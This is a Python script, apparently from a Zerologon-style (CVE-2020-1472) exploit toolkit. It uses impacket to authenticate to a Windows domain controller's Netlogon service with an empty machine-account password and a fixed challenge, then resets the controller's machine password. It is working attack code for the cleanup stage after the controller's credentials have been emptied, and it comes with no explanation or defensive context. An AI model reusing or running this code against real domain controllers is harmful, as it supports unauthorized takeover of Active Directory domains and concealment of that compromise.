import logging

from impacket.dcerpc.v5.nrpc import NetrServerPasswordSet2Response, NetrServerPasswordSet2
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5 import epm, nrpc
from Cryptodome.Cipher import AES
from struct import pack, unpack

class ChangeMachinePassword:
    KNOWN_PROTOCOLS = {
        135: {'bindstr': r'ncacn_ip_tcp:%s',           'set_host': False},
        139: {'bindstr': r'ncacn_np:%s[\PIPE\netlogon]', 'set_host': True},
        445: {'bindstr': r'ncacn_np:%s[\PIPE\netlogon]', 'set_host': True},
        }

    def __init__(self, username='', password=''):
        self.__username = username.rstrip('$')
        self.__password = password

    def dump(self, remoteName, remoteHost):

        stringbinding = epm.hept_map(remoteHost, nrpc.MSRPC_UUID_NRPC, protocol = 'ncacn_ip_tcp')
        logging.info('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)

        resp = nrpc.hNetrServerReqChallenge(dce, NULL, remoteName + '\x00', b'12345678')
        serverChallenge = resp['ServerChallenge']

        # Empty at this point
        self.sessionKey = nrpc.ComputeSessionKeyAES('', b'12345678', serverChallenge)

        self.ppp = nrpc.ComputeNetlogonCredentialAES(b'12345678', self.sessionKey)

        try:
            resp = nrpc.hNetrServerAuthenticate3(dce, '\\\\' + remoteName + '\x00', self.__username + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,remoteName + '\x00',self.ppp, 0x212fffff )
        except Exception as e:
            if str(e).find('STATUS_DOWNGRADE_DETECTED') < 0:
                raise
        self.clientStoredCredential = pack('<Q', unpack('<Q',self.ppp)[0] + 10)

        request = NetrServerPasswordSet2()
        request['PrimaryName'] = '\\\\' + remoteName + '\x00'
        request['AccountName'] = remoteName + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request['Authenticator'] = self.update_authenticator()
        request['ComputerName'] = remoteName + '\x00'
        encpassword = nrpc.ComputeNetlogonCredentialAES(self.__password, self.sessionKey)
        indata = b'\x00' * (512-len(self.__password)) + self.__password + pack('<L', len(self.__password))
        request['ClearNewPassword'] = nrpc.ComputeNetlogonCredentialAES(indata, self.sessionKey)
        result = dce.request(request)
        print('[+] Restore machine account password: OK')

    def update_authenticator(self, plus=10):
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredentialAES(self.clientStoredCredential, self.sessionKey)
        authenticator['Timestamp'] = plus
        return authenticator